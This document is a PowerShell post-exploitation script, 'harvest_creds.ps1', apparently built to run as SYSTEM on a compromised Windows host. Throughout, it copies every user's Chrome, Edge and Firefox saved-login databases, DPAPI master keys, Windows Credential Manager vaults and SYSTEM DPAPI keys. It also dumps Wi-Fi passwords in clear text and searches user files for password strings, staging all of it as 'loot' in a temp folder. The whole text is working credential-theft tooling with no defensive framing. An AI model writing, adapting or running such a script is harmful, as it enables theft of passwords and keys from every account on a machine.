# harvest_creds.ps1 — run as SYSTEM
# Collects Chrome/Edge/Firefox credential DBs + DPAPI master keys
# All files staged to C:\Windows\Temp\loot\

$out = "C:\Windows\Temp\loot"
New-Item -ItemType Directory -Force -Path $out | Out-Null

function Copy-Safe($src,$dst) {
    try { [IO.File]::Copy($src,$dst,$true); return $true } catch { return $false }
}

$users = Get-ChildItem C:\Users -Directory -Force -EA 0 |
    Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') }

foreach ($u in $users) {
    $uid = $u.Name
    $uout = "$out\$uid"; New-Item -ItemType Directory -Force -Path $uout | Out-Null

    # Chrome
    Get-ChildItem "$($u.FullName)\AppData\Local\Google\Chrome\User Data" -Directory -Force -EA 0 | % {
        $pname = $_.Name -replace '[^a-zA-Z0-9]','_'
        $db = "$($_.FullName)\Login Data"
        if (Test-Path $db) { Copy-Safe $db "$uout\chrome_${pname}_LoginData.db" | Out-Null }
        $ldb = "$($_.FullName)\Local State"
    }
    $ls = "$($u.FullName)\AppData\Local\Google\Chrome\User Data\Local State"
    if (Test-Path $ls) { Copy-Safe $ls "$uout\chrome_LocalState.json" | Out-Null }

    # Edge
    Get-ChildItem "$($u.FullName)\AppData\Local\Microsoft\Edge\User Data" -Directory -Force -EA 0 | % {
        $pname = $_.Name -replace '[^a-zA-Z0-9]','_'
        $db = "$($_.FullName)\Login Data"
        if (Test-Path $db) { Copy-Safe $db "$uout\edge_${pname}_LoginData.db" | Out-Null }
    }
    $els = "$($u.FullName)\AppData\Local\Microsoft\Edge\User Data\Local State"
    if (Test-Path $els) { Copy-Safe $els "$uout\edge_LocalState.json" | Out-Null }

    # Firefox
    Get-ChildItem "$($u.FullName)\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory -Force -EA 0 | % {
        $pname = $_.Name -replace '[^a-zA-Z0-9]','_'
        $pout = "$uout\ff_$pname"; New-Item -ItemType Directory -Force -Path $pout | Out-Null
        foreach ($f in @('logins.json','key4.db','cert9.db')) {
            $fp = "$($_.FullName)\$f"
            if (Test-Path $fp) { Copy-Safe $fp "$pout\$f" | Out-Null }
        }
    }

    # DPAPI master keys
    $protect = "$($u.FullName)\AppData\Roaming\Microsoft\Protect"
    if (Test-Path $protect -EA 0) {
        $dpout = "$uout\dpapi_protect"
        New-Item -ItemType Directory -Force -Path $dpout | Out-Null
        Get-ChildItem $protect -Recurse -Force -EA 0 | % {
            if (-not $_.PSIsContainer) {
                $rel = $_.FullName.Substring($protect.Length).TrimStart('\') -replace '\\','_'
                Copy-Safe $_.FullName "$dpout\$rel" | Out-Null
            }
        }
    }

    # Windows Credential Manager vaults
    $vault = "$($u.FullName)\AppData\Local\Microsoft\Credentials"
    if (Test-Path $vault -EA 0) {
        $vout = "$uout\wincred_local"; New-Item -ItemType Directory -Force -Path $vout | Out-Null
        Get-ChildItem $vault -Force -EA 0 | % { Copy-Safe $_.FullName "$vout\$($_.Name)" | Out-Null }
    }
    $vaultR = "$($u.FullName)\AppData\Roaming\Microsoft\Credentials"
    if (Test-Path $vaultR -EA 0) {
        $vout = "$uout\wincred_roaming"; New-Item -ItemType Directory -Force -Path $vout | Out-Null
        Get-ChildItem $vaultR -Force -EA 0 | % { Copy-Safe $_.FullName "$vout\$($_.Name)" | Out-Null }
    }
}

# SYSTEM DPAPI master keys
$sysprot = "$env:WINDIR\System32\Microsoft\Protect"
if (Test-Path $sysprot) {
    $sout = "$out\SYSTEM_dpapi"; New-Item -ItemType Directory -Force -Path $sout | Out-Null

    Get-ChildItem $sysprot -Recurse -Force -EA 0 | % {
        if (-not $_.PSIsContainer) {
            $rel = $_.FullName.Substring($sysprot.Length).TrimStart('\') -replace '\\','_'
            Copy-Safe $_.FullName "$sout\$rel" | Out-Null
        }
    }
}

# Wi-Fi passwords
$wlan_profiles = netsh wlan show profiles 2>$null
if ($wlan_profiles) {
    $wlan_profiles | Select-String "All User Profile\s*:\s*(.+)" | % {
        $ssid = $_.Matches[0].Groups[1].Value.Trim()
        $info = (netsh wlan show profile name="`"$ssid`"" key=clear 2>$null) -join "`n"
        $m = [regex]::Match($info, 'Key Content\s+:\s+(.+)')
        if ($m.Success) {
            "$ssid : $($m.Groups[1].Value.Trim())" | Out-File "$out\wifi_passwords.txt" -Append
        }
    }
}

# Credential files search
Get-ChildItem C:\Users -Recurse -Force -Include @('*.xml','*.txt','*.ini','*.config','*.json') -EA 0 |
    Where-Object { $_.Length -lt 512KB } |
    Select-String -Pattern 'password\s*[=:]\s*\S+' -EA 0 |
    Select-Object Path,Line |
    Export-Csv "$out\cred_strings.csv" -NoTypeInformation -EA 0

Write-Host "[+] Loot staged to $out"
Get-ChildItem $out -Recurse | Measure-Object | % { Write-Host "[+] $($_.Count) files collected" }
